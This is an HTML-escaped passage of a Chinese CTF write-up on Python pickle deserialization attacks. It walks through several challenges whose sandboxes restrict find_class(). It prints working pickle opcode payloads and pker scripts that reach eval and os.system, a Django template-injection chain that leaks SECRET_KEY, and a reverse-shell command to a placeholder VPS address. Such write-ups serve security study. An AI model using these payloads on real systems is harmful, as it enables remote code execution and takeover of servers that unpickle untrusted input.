&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># config.py&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy&amp;#34;&lt;/span>
&lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">username&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">backdoor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œçš„é™åˆ¶æŒºç®€å•çš„äº†ï¼Œè¦†ç›–ä¸€ä¸ªnotadminå­—å…¸adminé”®çš„å€¼ä¸ºyeså³å¯æ‰§è¡Œç»™å‡ºçš„åŽé—¨å‡½æ•°&lt;code>eval()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># ç”¨pker.pyç”Ÿæˆpayload&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;notadmin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;span style="color:#111">door&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;backdoor&amp;#34;&lt;/span>&lt;span style="color:#111">,[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;subprocess&amp;#39;).call(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">echo -e &amp;#39;#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&amp;#39;&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,shell=True)&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽ&lt;code>base64.b64encode(data)&lt;/code>åŠ è¿›&lt;code>session['info']&lt;/code>ä¸­æ‹¿åˆ°shell&lt;/p>
&lt;p>çœ‹wpï¼ŒåŽé¢çš„æ­¥éª¤å¥½åƒè¿˜è·Ÿpwnæœ‰ç‚¹å…³ç³»ï¼Œæˆ‘å¯¹pwnæ¯«æ— ç ”ç©¶ï¼Œä¸çŒ®ä¸‘äº†ï¼ŒæŒ‡è·¯ä¸¤ä¸ªwp-&amp;gt;&lt;a href="https://juejin.cn/post/6994717395298287624">wp1&lt;/a> | &lt;a href="https://ctf.njupt.edu.cn/663.html#what_pickle">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥builtinsæ¨¡å—">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥&lt;code>builtins&lt;/code>æ¨¡å—&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png" alt="img">&lt;/p>
&lt;p>æ›´å¤šçŸ¥è¯†å‚è€ƒï¼š&lt;a href="https://blog.51cto.com/xpleaf/1764849">æ·±å…¥ç†è§£Pythonä¸­çš„&lt;code>__builtin__&lt;/code>å’Œ&lt;code>__builtins__&lt;/code>&lt;/a> | [Python çš„å†…å»ºå¯¹è±¡](&lt;a href="https://www.jianshu.com/p/645e973">https://www.jianshu.com/p/645e973&lt;/a> 83c1f) | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> ä¸Ž &lt;code>__builtin__&lt;/code>ï¼ˆbuiltinsï¼‰&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­4 - [Code-Breaking 2018] picklecode
&lt;/h4>
&lt;/summary>
&lt;p>æœ¬åœ°å¤çŽ°è¿˜æ˜¯å¤±è´¥ï¼Œdockeråœ°å€-&amp;gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecodeï¼ˆå°±è·Ÿè¢«dockerè¯…å’’äº†ä¸€æ · ä»Žæ¥æ²¡æœ‰æˆåŠŸçš„ç”¨dockerå¤çŽ°è¿‡ä¸€é“é¢˜ðŸ˜­ðŸ˜­ðŸ˜­çœŸå°±è„‘è¡¥å‡ºflagäº†&lt;/p>
&lt;p>å®¡è®¡æºç ï¼Œæ˜¯ä¸€ä¸ªdjangoçš„é¡¹ç›®ï¼ˆæ­£å¥½ä¹‹å‰çš„å®žè®­åšçš„å°±æ˜¯djangoçš„é¡¹ç›®ï¼Œçœ‹æºç è½»æ¾ä¸€äº›ï¼‰ï¼Œä¸»æ–‡ä»¶å¤¹æ˜¯coreï¼Œæœ‰ä¸€ä¸ªåä¸ºchallengeçš„app&lt;/p>
&lt;p>çœ‹coreä¸‹çš„settings.pyæ¯”é»˜è®¤çš„é…ç½®å¤šäº†54å’Œ55è¡Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152122940.png" alt="image-20210809152122940">&lt;/p>
&lt;p>ç”¨äº†ç‰¹æ®Šçš„SESSION_ENGINEå’ŒSESSION_SERIALIZERï¼Œå‰è€…æŒ‡çš„æ˜¯djangoå°†ç”¨æˆ·è®¤è¯ä¿¡æ¯å­˜å‚¨åœ¨å“ªé‡Œ åŽè€…æŒ‡djangoç”¨ä»€ä¹ˆæ–¹å¼å­˜å‚¨è®¤è¯ä¿¡æ¯ï¼Œä¹Ÿå°±ç›¸å½“äºŽå…ˆç»è¿‡SESSION_SERIAZLIZERæŒ‡å®šçš„æ–¹å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå†æœ‰SESSION_ENGINEæŒ‡å®šçš„æ–¹å¼å­˜å‚¨åˆ°æŸä¸ªåœ°æ–¹ã€‚é»˜è®¤çš„djangoé¡¹ç›®ä¸­ï¼Œå­˜å‚¨ä½ç½®åº”è¯¥æ˜¯django.contrib.sessions.backends.dbï¼Œåºåˆ—åŒ–æ–¹å¼åº”è¯¥æ˜¯django.contrib.sessions.serializers.JSONSerializerï¼›è€Œè¿™é‡Œå°±æ˜¯ç”¨pickleåºåˆ—åŒ–åŽçš„å½¢å¼ï¼ŒåŠ ç­¾åsingedåŽå­˜å‚¨åœ¨cookieä¸­ã€‚é‚£è¿™é‡Œè‚¯å®šè¦æŽ§åˆ¶sessionï¼Œç»“åˆpickleæ¥rceäº†ï¼›è·Ÿè¿‡åŽ»çœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152317363.png" alt="image-20210809152317363">&lt;/p>
&lt;p>ä¾æ—§æ˜¯é‡å†™äº†&lt;code>find_class()&lt;/code>æ–¹æ³•ï¼Œåªæœ‰æ¨¡å—æ˜¯å†…ç½®çš„builtinsï¼ˆä¸éœ€è¦importå°±å¯ä»¥ç”¨çš„ï¼‰å¹¶ä¸”åå­—ä¸èƒ½åœ¨é»‘åå•ä¸­æ‰å¯ä»¥ï¼›è¿™é‡Œçš„ç»•è¿‡æ˜¯ç¬¬äºŒä¸ªè€ƒç‚¹äº†ï¼Œå…ˆç¿»å›žåŽ»çœ‹ä¸€ä¸‹ä»…æœ‰çš„appçš„views.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809153617320.png" alt="image-20210809153617320">&lt;/p>
&lt;p>æ¨¡æ¿éƒ¨åˆ†ç›´æŽ¥æ‹¼æŽ¥äº†request.user.usernameï¼Œè¿™æ˜¯æ³¨å†Œæ—¶ä¼ å…¥ï¼Œæœ‰æ¨¡æ¿æ³¨å…¥æ¼æ´žï¼Œæ‰¾æ‰¾è°ƒç”¨é“¾&lt;/p>
&lt;p>ï¼ˆå› ä¸ºæœ¬åœ°çŽ¯å¢ƒå¤ªåžƒåœ¾äº† æ²¡å¤çŽ° è¿™é‡Œäº‘åšé¢˜äº†ï¼‰åœ¨æ¨¡æ¿å¤„ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šçš„ä¸Šä¸‹æ–‡å˜é‡ï¼Œé€šå¸¸ä¼šå­˜åœ¨çš„æœ‰request, user, permsï¼Œè¿™é‡Œç”¨çš„åˆ©ç”¨é“¾æ˜¯ï¼ˆæ³¨æ„djangoæ¨¡æ¿å¼•æ“Žæ— æ³•è¯»å–ä¸‹åˆ’çº¿å¼€å¤´çš„å±žæ€§ï¼‰&lt;code>{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}&lt;/code>ï¼Œæ³¨å†Œä¸€ä¸ªåä¸ºè¿™ä¸ªçš„ç”¨æˆ·å³å¯èŽ·å¾—ç­¾åçš„å¯†é’¥ã€‚&lt;/p>
&lt;p>å†æŽ‰å¤´å›žåŽ»æ€è€ƒopcodeçš„ç¼–å†™ã€‚é‡å†™&lt;code>find_class()&lt;/code>ä¹‹åŽé™åˆ¶å¾ˆå¤šï¼Œä½†é€šè¿‡builtinsä»ç„¶å¯ä»¥ç”¨&lt;code>getattr()&lt;/code>ï¼›é‚£ä¹ˆå°±åˆ†ä¸¤æ­¥èµ°ï¼Œå…ˆé€šè¿‡&lt;code>builtins.getattr('builtins, 'eval')&lt;/code>æ¥èŽ·å–&lt;code>eval()&lt;/code>ï¼Œå†æ‰§è¡Œä»£ç ã€‚é‚£ä¹ˆå¦‚ä½•æ‰‹å†™protocol=0çš„opcodeæï¼Ÿ&lt;/p>
&lt;p>é¦–å…ˆå¼•å…¥æ¨¡å—builtinså’Œå‡½æ•°getattr&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽéœ€è¦èŽ·å–å½“å‰çš„ä¸Šä¸‹æ–‡ï¼Œç”¨globals()&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>globalsæ˜¯ä¸ªå­—å…¸ï¼Œæ‰€ä»¥è¿˜è¦èŽ·å–dictè¿™ä¸ªå¯¹è±¡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿˜è¦æ‰§è¡Œglobals()èŽ·å–å®Œæ•´ä¸Šä¸‹æ–‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ ˆé¡¶å…ƒç´ æ˜¯builtins.globalsï¼ŒåŽ‹å…¥ä¸€ä¸ªç©ºå…ƒç»„&lt;code>(t&lt;/code>ï¼Œç„¶åŽç”¨&lt;code>R&lt;/code>æ‰§è¡Œ&lt;/p>
&lt;p>ç„¶åŽç”¨dict.get()æ–¹æ³•ä»Žglobalsçš„å­—å…¸ä¸­æ‹¿åˆ°é”®åä¸ºbuiltionsçš„å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ååºåˆ—åŒ–åŽå¾—åˆ°builtinså¯¹è±¡&lt;code>&amp;lt;module 'builtins' (built-in)&amp;gt;&lt;/code>ï¼›ä¹‹åŽå†ç”¨getatträ»Žbuiltinså¯¹è±¡ä¸­å–å‡ºevalï¼Œä¹Ÿå°±æ˜¯å†å¥—ä¸€å±‚å¨ƒ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>&amp;lt;built-in function eval&amp;gt;&lt;/code>çŽ°åœ¨å·²ç»æ‹¿åˆ°äº†evalå¯¹è±¡ï¼Œå†æ‰§è¡Œä»£ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;ls&amp;#34;)&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809172045469.png" alt="image-20210809172045469">&lt;/p>
&lt;p>æˆåŠŸæ‰§è¡Œä»£ç ï¼ˆæ³¨æ„è¿è¡Œæ—¶ä¸ä»…éœ€è¦å¼•å…¥pickle ä¹Ÿè¦å¼•å…¥builtinsæ‰å¯ä»¥ï¼ï¼‰&lt;/p>
&lt;p>â€”â€”â€”â€”ç”¨pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‚è€ƒï¼š&lt;a href="https://www.redmango.top/article/64">wp1&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breakingä¸­çš„ä¸¤ä¸ªPythonæ²™ç®±&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žï¼ˆDjangoä¸ºä¾‹ï¼‰&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥sysæ¨¡å—åå­—ä¸­ä¸å¸¦ç‚¹å·">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥&lt;code>sys&lt;/code>æ¨¡å—&amp;amp;åå­—ä¸­ä¸å¸¦&lt;code>.&lt;/code>ç‚¹å·&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­5 - [BalsnCTF 2019] Pyshv1
&lt;/h4>
&lt;/summary>
&lt;p>é¢˜ç›®çŽ¯å¢ƒ-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1&lt;/p>
&lt;p>å®¡è®¡ä¸€ä¸‹æºç ï¼Œå…ˆçœ‹ä¸€ä¸‹è‚¯å®šä¼šä¸secureçš„securePickle.oy&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811212055295.png" alt="image-20210811212055295">&lt;/p>
&lt;p>é‡å†™&lt;code>find_class()&lt;/code>ï¼Œè¢«è°ƒç”¨æ—¶å¯ä»¥çµæ´»æ·»åŠ ç™½åå•ï¼›å†çœ‹çœ‹server.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811211736904.png" alt="image-20210811211736904">&lt;/p>
&lt;p>å°†è¾“å…¥çš„å†…å®¹å…ˆè½¬ä¸ºasciiç å½¢å¼è¢«b64åŠ å¯†ï¼Œå†ååºåˆ—åŒ–å‡ºæ¥ï¼›å…¶ä¸­ç™½åå•æ˜¯sysæ¨¡å—&lt;/p>
&lt;p>ä½†æ˜¯è¿™ä¸ªsysæ¨¡å—å¹¶ä¸å®‰å…¨ï¼šsysæ¨¡å—æœ‰ä¸€ä¸ªå­—å…¸å¯¹è±¡sys.modulesï¼Œå®ƒåŒ…å«äº†è¿è¡Œæ—¶æ‰€æœ‰pyç¨‹åºæ‰€å¼•å…¥çš„æ‰€æœ‰æ¨¡å—(a cache of imported modules) ï¼Œå¦‚æžœå®ƒè¢«æ”¹å˜ å¼•å…¥çš„æ¨¡å—å°±ä¼šè¢«æ”¹å˜ã€‚è€Œå®ƒä¹ŸåŒ…æ‹¬sysæœ¬èº«ï¼Œä¹Ÿå°±æ˜¯å¥—å¨ƒ&lt;code>sys.modules['sys']=sys.modules&lt;/code>ã€‚é‚£ä¹ˆå¦‚æžœæˆ‘ä»¬å…ˆä»Žsysä¸­å¼•å…¥modules: &lt;code>import modules from sys&lt;/code>ï¼Œç„¶åŽå°†&lt;code>modules['sys']&lt;/code>æ”¹ä¸º&lt;code>modules['os']&lt;/code>å°±å°†æˆåŠŸå¼•å…¥osæ¨¡å—ã€‚&lt;/p>
&lt;p>ä½†æœ‰ä¸ªç¼ºé™·æ˜¯modulesä¸ºdictï¼Œéœ€è¦ç”¨&lt;code>getattr(sys.modules[module], name)&lt;/code>è¿›è¡Œå–å€¼ï¼Œä¹Ÿå°±æ˜¯å…ˆå–å‡ºmodulesä¸­çš„getå‡½æ•°ï¼Œç„¶åŽå†ç”¨getæ¥å–å‡ºosï¼Œå†è¿›è¡Œæ›¿æ¢ä¿®æ”¹&lt;/p>
&lt;p>pker&lt;/p>
&lt;pre tabindex="0">&lt;code>modules=GLOBAL('sys', 'modules')
modules['sys']=modules
modules_get=GLOBAL('sys', 'get')
os=modules_get('os')
modules['sys']=os
system=GLOBAL('sys', 'system')
system('dir')
return
&lt;/code>&lt;/pre>&lt;p>opcode:&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;csys\nmodules\np0\n0g0\nS'sys'\ng0\nscsys\nget\np2\n0g2\n(S'os'\ntRp3\n0g0\nS'sys'\ng3\nscsys\nsystem\np5\n0g5\n(S'dir'\ntR.&amp;quot;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811215300764.png" alt="image-20210811215300764">&lt;/p>
&lt;/details>
